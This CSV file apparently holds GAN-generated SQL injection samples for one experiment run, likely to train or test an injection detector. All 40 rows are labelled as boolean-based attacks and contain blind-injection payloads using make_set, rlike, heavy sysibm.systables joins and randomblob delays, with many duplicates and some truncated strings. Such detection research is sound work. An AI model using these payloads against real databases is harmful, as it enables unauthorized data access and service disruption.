label,payload,family,payload_type,method,run_id,sample_index
attack,1%'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +'x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,1
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,2
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,3
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,4
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,5
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,6
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,7
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,8
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,9
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,10
attack,"-6846%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,11
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,12
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,13
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,14
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,15
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,16
attack,"-6846%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,17
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,18
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,19
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,20
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,21
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,22
attack,"-9688%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,23
attack,"-1422%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,24
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,25
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,26
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,27
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,28
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,29
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,30
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,31
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,32
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,33
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,34
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,35
attack,"-9688"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,36
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,37
attack,"-9688%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,38
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,39
